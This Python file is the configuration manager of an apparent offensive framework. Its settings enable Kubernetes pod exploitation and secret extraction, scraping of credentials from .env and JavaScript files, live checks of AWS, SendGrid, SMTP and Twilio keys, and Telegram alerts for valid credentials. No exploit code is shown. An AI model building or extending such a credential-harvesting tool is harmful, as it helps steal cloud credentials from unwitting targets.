#!/usr/bin/env python3
"""
⚙️ WWYVQ Framework v2.1 - Configuration Manager
Ultra-Organized Architecture - Centralized Configuration System

Responsibilities:
- Configuration loading/saving (YAML/JSON)
- Profile management (dev, prod, test)
- Hot reload capabilities
- Configuration validation
- Environment-specific settings
"""

import os
import json
import yaml
from pathlib import Path
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, asdict
from enum import Enum


class LogLevel(Enum):
    """Logging levels"""
    DEBUG = "DEBUG"
    INFO = "INFO"
    WARNING = "WARNING"
    ERROR = "ERROR"
    CRITICAL = "CRITICAL"


@dataclass
class CoreConfig:
    """Core engine configuration"""
    session_id: str = "auto"
    max_concurrent: int = 100
    timeout: int = 30
    retry_attempts: int = 3
    safe_mode: bool = True
    debug_mode: bool = False
    rate_limit: float = 2.0  # requests per second
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


@dataclass
class TargetConfig:
    """Target management configuration"""
    default_ports: List[int] = None
    cidr_expansion: bool = True
    max_targets: int = 10000
    dns_resolution: bool = True
    ip_randomization: bool = True
    
    def __post_init__(self):
        if self.default_ports is None:
            self.default_ports = [80, 443, 8080, 8443, 6443, 10250, 2379, 2380]


@dataclass
class ExploitConfig:
    """Kubernetes exploitation configuration"""
    k8s_focus: bool = True
    cluster_detection: bool = True
    pod_exploitation: bool = True
    service_account_enum: bool = True
    secret_extraction: bool = True
    rbac_enumeration: bool = True
    network_policies: bool = True
    admission_controllers: bool = True
    cve_exploitation: bool = True
    stealth_mode: bool = False


@dataclass
class ScrapeConfig:
    """Credential scraping configuration"""
    api_key_patterns: bool = True
    env_file_extraction: bool = True
    js_file_analysis: bool = True
    config_file_hunt: bool = True
    max_paths: int = 2500
    depth_limit: int = 5
    file_size_limit: int = 1048576  # 1MB
    regex_patterns: bool = True
    heuristic_analysis: bool = True


@dataclass
class ValidatorConfig:
    """Credential validation configuration"""
    real_time_validation: bool = True
    aws_validation: bool = True
    sendgrid_validation: bool = True
    smtp_validation: bool = True
    mailgun_validation: bool = True
    twilio_validation: bool = True
    classification_enabled: bool = True
    confidence_threshold: float = 0.7
    validation_timeout: int = 10


@dataclass
class NotifierConfig:
    """Notification configuration"""
    telegram_enabled: bool = True
    discord_enabled: bool = False
    valid_creds_only: bool = True
    professional_format: bool = True
    telegram_token: str = ""
    telegram_chat_id: str = ""
    discord_webhook: str = ""
    notification_threshold: float = 0.8


@dataclass
class ExporterConfig:
    """Data export configuration"""
    auto_export: bool = True
    export_format: str = "json"  # json, yaml, csv
    export_path: str = "./results"
    session_backup: bool = True
    result_archiving: bool = True
    report_generation: bool = True


@dataclass
class InterfaceConfig:
    """Interface configuration"""
    cli_colors: bool = True
    web_enabled: bool = True
    api_enabled: bool = True
    web_host: str = "0.0.0.0"
    web_port: int = 8080
    api_host: str = "0.0.0.0"
    api_port: int = 8081
    api_auth: bool = True
    api_key: str = ""


@dataclass
class LoggingConfig:
    """Logging configuration"""
    level: str = "INFO"
    file_logging: bool = True
    console_logging: bool = True
    log_file: str = "./logs/wwyvq_v2.1.log"
    max_log_size: int = 10485760  # 10MB
    backup_count: int = 5
    log_format: str = "%(asctime)s | %(levelname)8s | %(name)s | %(message)s"


@dataclass
class WWYVQConfig:
    """Main WWYVQ configuration"""
    core: CoreConfig = None
    targets: TargetConfig = None
    exploit: ExploitConfig = None
    scrape: ScrapeConfig = None
    validator: ValidatorConfig = None
    notifier: NotifierConfig = None
    exporter: ExporterConfig = None
    interface: InterfaceConfig = None
    logging: LoggingConfig = None
    
    def __post_init__(self):
        if self.core is None:
            self.core = CoreConfig()
        if self.targets is None:
            self.targets = TargetConfig()
        if self.exploit is None:
            self.exploit = ExploitConfig()
        if self.scrape is None:
            self.scrape = ScrapeConfig()
        if self.validator is None:
            self.validator = ValidatorConfig()
        if self.notifier is None:
            self.notifier = NotifierConfig()
        if self.exporter is None:
            self.exporter = ExporterConfig()
        if self.interface is None:
            self.interface = InterfaceConfig()
        if self.logging is None:
            self.logging = LoggingConfig()


class ConfigurationManager:
    """
    Ultra-organized configuration management system
    
    Features:
    - YAML/JSON configuration files
    - Environment-specific profiles
    - Hot reload capabilities
    - Comprehensive validation
    - Default value management
    """
    
    def __init__(self, config_path: Optional[str] = None):
        """
        Initialize configuration manager
        
        Args:
            config_path: Path to configuration file
        """
        self.config_path = self._resolve_config_path(config_path)
        self.config = WWYVQConfig()
        self.profiles = {}
        self.current_profile = "default"
        
        # Load configuration
        self._load_config()
    
    def _resolve_config_path(self, config_path: Optional[str]) -> Path:
        """Resolve configuration file path"""
        if config_path:
            return Path(config_path)
        
        # Look for config files in order of preference
        search_paths = [
            Path("./wwyvq_v21/config/default.yaml"),
            Path("./wwyvq_v21/config/default.json"),
            Path("./config/wwyvq_v21.yaml"),
            Path("./config/wwyvq_v21.json"),
            Path("./wwyvq_config.yaml"),
            Path("./wwyvq_config.json")
        ]
        
        for path in search_paths:
            if path.exists():
                return path
        
        # Default to YAML in config directory
        return Path("./wwyvq_v21/config/default.yaml")
    
    def _load_config(self):
        """Load configuration from file"""
        if not self.config_path.exists():
            print(f"ℹ️ Configuration file not found: {self.config_path}")
            print("ℹ️ Creating default configuration...")
            self._create_default_config()
            return
        
        try:
            with open(self.config_path, 'r') as f:
                if self.config_path.suffix.lower() == '.yaml':
                    config_data = yaml.safe_load(f)
                elif self.config_path.suffix.lower() == '.json':
                    config_data = json.load(f)
                else:
                    # Try to auto-detect
                    content = f.read()
                    try:
                        config_data = yaml.safe_load(content)
                    except:
                        config_data = json.loads(content)
            
            if config_data:
                self._update_config_from_dict(config_data)
                print(f"✅ Configuration loaded from {self.config_path}")
            else:
                print("⚠️ Empty configuration file, using defaults")
                
        except Exception as e:
            print(f"❌ Failed to load configuration: {e}")
            print("ℹ️ Using default configuration")
    
    def _update_config_from_dict(self, config_data: Dict[str, Any]):
        """Update configuration from dictionary"""
        
        # Update core config
        if 'core' in config_data:
            core_data = config_data['core']
            for key, value in core_data.items():
                if hasattr(self.config.core, key):
                    setattr(self.config.core, key, value)
        
        # Update targets config
        if 'targets' in config_data:
            targets_data = config_data['targets']
            for key, value in targets_data.items():
                if hasattr(self.config.targets, key):
                    setattr(self.config.targets, key, value)
        
        # Update exploit config
        if 'exploit' in config_data:
            exploit_data = config_data['exploit']
            for key, value in exploit_data.items():
                if hasattr(self.config.exploit, key):
                    setattr(self.config.exploit, key, value)
        
        # Update scrape config
        if 'scrape' in config_data:
            scrape_data = config_data['scrape']
            for key, value in scrape_data.items():
                if hasattr(self.config.scrape, key):
                    setattr(self.config.scrape, key, value)
        
        # Update validator config
        if 'validator' in config_data:
            validator_data = config_data['validator']
            for key, value in validator_data.items():
                if hasattr(self.config.validator, key):
                    setattr(self.config.validator, key, value)
        
        # Update notifier config
        if 'notifier' in config_data:
            notifier_data = config_data['notifier']
            for key, value in notifier_data.items():
                if hasattr(self.config.notifier, key):
                    setattr(self.config.notifier, key, value)
        
        # Update exporter config
        if 'exporter' in config_data:
            exporter_data = config_data['exporter']
            for key, value in exporter_data.items():
                if hasattr(self.config.exporter, key):
                    setattr(self.config.exporter, key, value)
        
        # Update interface config
        if 'interface' in config_data:
            interface_data = config_data['interface']
            for key, value in interface_data.items():
                if hasattr(self.config.interface, key):
                    setattr(self.config.interface, key, value)
        
        # Update logging config
        if 'logging' in config_data:
            logging_data = config_data['logging']
            for key, value in logging_data.items():
                if hasattr(self.config.logging, key):
                    setattr(self.config.logging, key, value)
        
        # Load profiles
        if 'profiles' in config_data:
            self.profiles = config_data['profiles']
    
    def _create_default_config(self):
        """Create default configuration file"""
        # Create config directory if it doesn't exist
        self.config_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Create default configuration
        default_config = {
            'core': asdict(self.config.core),
            'targets': asdict(self.config.targets),
            'exploit': asdict(self.config.exploit),
            'scrape': asdict(self.config.scrape),
            'validator': asdict(self.config.validator),
            'notifier': asdict(self.config.notifier),
            'exporter': asdict(self.config.exporter),
            'interface': asdict(self.config.interface),
            'logging': asdict(self.config.logging),
            'profiles': {
                'dev': {
                    'core': {'debug_mode': True, 'safe_mode': True},
                    'logging': {'level': 'DEBUG'}
                },
                'prod': {
                    'core': {'debug_mode': False, 'safe_mode': False},
                    'logging': {'level': 'INFO'}
                },
                'test': {
                    'core': {'debug_mode': True, 'safe_mode': True, 'max_concurrent': 10},
                    'logging': {'level': 'DEBUG'}
                }
            }
        }
        
        # Save configuration
        try:
            with open(self.config_path, 'w') as f:
                if self.config_path.suffix.lower() == '.yaml':
                    yaml.dump(default_config, f, default_flow_style=False, indent=2)
                else:
                    json.dump(default_config, f, indent=2)
            
            print(f"✅ Default configuration created: {self.config_path}")
            
        except Exception as e:
            print(f"❌ Failed to create default configuration: {e}")
    
    def validate_config(self) -> bool:
        """Validate configuration"""
        try:
            # Validate core config
            if self.config.core.max_concurrent <= 0:
                print("❌ Invalid max_concurrent: must be > 0")
                return False
            
            if self.config.core.timeout <= 0:
                print("❌ Invalid timeout: must be > 0")
                return False
            
            if self.config.core.retry_attempts < 0:
                print("❌ Invalid retry_attempts: must be >= 0")
                return False
            
            if self.config.core.rate_limit <= 0:
                print("❌ Invalid rate_limit: must be > 0")
                return False
            
            # Validate targets config
            if not self.config.targets.default_ports:
                print("❌ No default ports configured")
                return False
            
            if self.config.targets.max_targets <= 0:
                print("❌ Invalid max_targets: must be > 0")
                return False
            
            # Validate scrape config
            if self.config.scrape.max_paths <= 0:
                print("❌ Invalid max_paths: must be > 0")
                return False
            
            if self.config.scrape.depth_limit < 0:
                print("❌ Invalid depth_limit: must be >= 0")
                return False
            
            # Validate validator config
            if not (0 <= self.config.validator.confidence_threshold <= 1):
                print("❌ Invalid confidence_threshold: must be between 0 and 1")
                return False
            
            # Validate logging config
            if self.config.logging.level not in ['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']:
                print(f"❌ Invalid logging level: {self.config.logging.level}")
                return False
            
            print("✅ Configuration validation passed")
            return True
            
        except Exception as e:
            print(f"❌ Configuration validation failed: {e}")
            return False
    
    def get_config(self) -> WWYVQConfig:
        """Get current configuration"""
        return self.config
    
    def update_config(self, updates: Dict[str, Any]):
        """Update configuration with new values"""
        self._update_config_from_dict(updates)
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            config_dict = {
                'core': asdict(self.config.core),
                'targets': asdict(self.config.targets),
                'exploit': asdict(self.config.exploit),
                'scrape': asdict(self.config.scrape),
                'validator': asdict(self.config.validator),
                'notifier': asdict(self.config.notifier),
                'exporter': asdict(self.config.exporter),
                'interface': asdict(self.config.interface),
                'logging': asdict(self.config.logging),
                'profiles': self.profiles
            }
            
            with open(self.config_path, 'w') as f:
                if self.config_path.suffix.lower() == '.yaml':
                    yaml.dump(config_dict, f, default_flow_style=False, indent=2)
                else:
                    json.dump(config_dict, f, indent=2)
            
            print(f"✅ Configuration saved to {self.config_path}")
            
        except Exception as e:
            print(f"❌ Failed to save configuration: {e}")
    
    def load_profile(self, profile_name: str) -> bool:
        """Load a specific profile"""
        if profile_name not in self.profiles:
            print(f"❌ Profile '{profile_name}' not found")
            return False
        
        try:
            profile_config = self.profiles[profile_name]
            self._update_config_from_dict(profile_config)
            self.current_profile = profile_name
            print(f"✅ Profile '{profile_name}' loaded")
            return True
            
        except Exception as e:
            print(f"❌ Failed to load profile '{profile_name}': {e}")
            return False
    
    def create_profile(self, profile_name: str, config_overrides: Dict[str, Any]):
        """Create a new profile"""
        self.profiles[profile_name] = config_overrides
        print(f"✅ Profile '{profile_name}' created")
    
    def list_profiles(self) -> List[str]:
        """List available profiles"""
        return list(self.profiles.keys())
    
    def get_profile(self, profile_name: str) -> Optional[Dict[str, Any]]:
        """Get profile configuration"""
        return self.profiles.get(profile_name)
    
    def reload_config(self):
        """Reload configuration from file"""
        self._load_config()
        print("✅ Configuration reloaded")